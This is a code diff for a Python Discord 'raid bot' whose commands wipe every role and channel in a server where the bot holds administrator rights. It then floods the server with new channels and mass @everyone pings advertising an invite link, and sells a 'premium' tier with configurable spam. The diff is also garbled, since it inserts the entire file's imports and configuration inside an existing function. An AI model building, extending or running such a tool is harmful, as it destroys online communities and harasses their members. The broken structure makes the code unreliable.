@@ -97,16 +97,140 @@ async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, 
     guild = ctx.guild
     original_member_count = guild.member_count
     command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
+import discord
+from discord.ext import commands
+import asyncio
+import os
+import aiohttp
+from datetime import datetime
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
+TOKEN = os.getenv('DISCORD_TOKEN')
+
+# --- CONFIGURATION ---
+CENTRAL_SERVER_ID = 1453920087194206394
+PREMIUM_ROLE_ID = 1458177413325259035
+OWNER_ID = 1450919094202269881
+LOG_CHANNEL_ID = 1458257075393003561
+
+# --- NUKE COMMAND TEXTS & CONFIG ---
+NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
+NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
+PREMIUM_CHANNEL_NAME = "premium-raid"
+PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
+RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"
+
+# Bot setup
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)
+
+# --- PREMIUM CHECK FUNCTION ---
+def is_premium():
+    async def predicate(ctx):
+        if ctx.author.id == OWNER_ID: return True
+        central_server = bot.get_guild(CENTRAL_SERVER_ID)
+        if not central_server: return False
+        member = central_server.get_member(ctx.author.id)
+        if not member or not any(role.id == PREMIUM_ROLE_ID for role in member.roles):
+            try: await ctx.send("Access Denied: This is a premium command.", delete_after=10)
+            except discord.Forbidden: pass
+            return False
+        return True
+    return commands.check(predicate)
+
+@bot.event
+async def on_ready():
+    print(f'Raid Bot connected as {bot.user.name}')
+    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
+    print(f'Logging to Channel ID: {LOG_CHANNEL_ID}')
+
+# --- HELP COMMAND ---
+@bot.command(name='help')
+async def custom_help(ctx):
+    if ctx.channel.id == LOG_CHANNEL_ID: return
+    if ctx.guild.id == CENTRAL_SERVER_ID:
+        embed = discord.Embed(title="Bot Command Manual", description="This is a protected server. Destructive commands are disabled here.", color=discord.Color.orange())
+        await ctx.send(embed=embed, delete_after=30)
+        return
+    await ctx.message.delete()
+    embed = discord.Embed(title="Bot Command Manual", description="This bot provides public and premium raiding capabilities.", color=discord.Color.from_rgb(47, 49, 54))
+    embed.add_field(name="Public Command", value="`:nuke`\nInitiates a standard raid (25 channels, 500 total pings).", inline=False)
+    embed.add_field(name="Premium Commands", value="`:premiumnuke`\nInitiates a destructive raid (50 channels, 1000 total pings, icon change, role spam).\n\n`:nukeconfig <name> <text>`\nConfigures the `:premiumnuke` command.", inline=False)
+    help_message = await ctx.send(embed=embed)
+    await asyncio.sleep(60)
+    await help_message.delete()
+
+# --- NUKE COMMANDS ---
+@bot.command(name='nuke')
+async def nuke_normal(ctx):
+    if ctx.guild.id == CENTRAL_SERVER_ID: return
+    if not ctx.guild.me.guild_permissions.administrator: return
+    await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
+
+@bot.command(name='premiumnuke')
+@is_premium()
+async def premium_nuke(ctx):
+    if ctx.guild.id == CENTRAL_SERVER_ID: return
+    if not ctx.guild.me.guild_permissions.administrator: return
+    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
+
+# --- CONFIGURATION COMMAND (PREMIUM) ---
+@bot.command(name='nukeconfig')
+@is_premium()
+async def nuke_config(ctx, *, args: str = None):
+    if ctx.guild.id == CENTRAL_SERVER_ID: return
+    if not args or "," not in args:
+        await ctx.send("Formato incorrecto. Usa: `:nukeconfig nombre, texto/link`", delete_after=10)
+        return
+
+    # Split by the first comma found
+    channel_name, spam_text = args.split(",", 1)
+    
+    # Clean up whitespace
+    channel_name = channel_name.strip()
+    spam_text = spam_text.strip()
+
+    if not channel_name or not spam_text:
+        await ctx.send("El nombre del canal y el texto no pueden estar vacíos.", delete_after=10)
+        return
+
+    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
+    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
+    
+    try: await ctx.message.delete()
+    except: pass
+
+    embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
+    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
+    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
+    confirmation_msg = await ctx.send(embed=embed)
+    await asyncio.sleep(15)
+    try: await confirmation_msg.delete()
+    except: pass
+
+# --- CENTRAL NUKE LOGIC ---
+async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
+    guild = ctx.guild
+    original_member_count = guild.member_count
+    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
     print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")
     
     pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
+    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
     
     destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
     if is_premium:
         destruction_tasks.append(execute_premium_actions(guild))
     await asyncio.gather(*destruction_tasks, return_exceptions=True)
     
-    spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, pings_per_channel) for i in range(num_channels)]
+    spam_tasks = []
+    for i in range(num_channels):
+        # Distribute remaining pings among the first few channels
+        extra_ping = 1 if i < remaining_pings else 0
+        spam_tasks.append(create_and_spam(guild, channel_name, spam_text, i, pings_per_channel + extra_ping))
+    
     await asyncio.gather(*spam_tasks)
     
     print(f"{command_type} finished for {guild.name}.")
@@ -205,4 +329,3 @@ if __name__ == "__main__":
         bot.run(TOKEN)
     else:
         print("Error: DISCORD_TOKEN is not configured.")
-
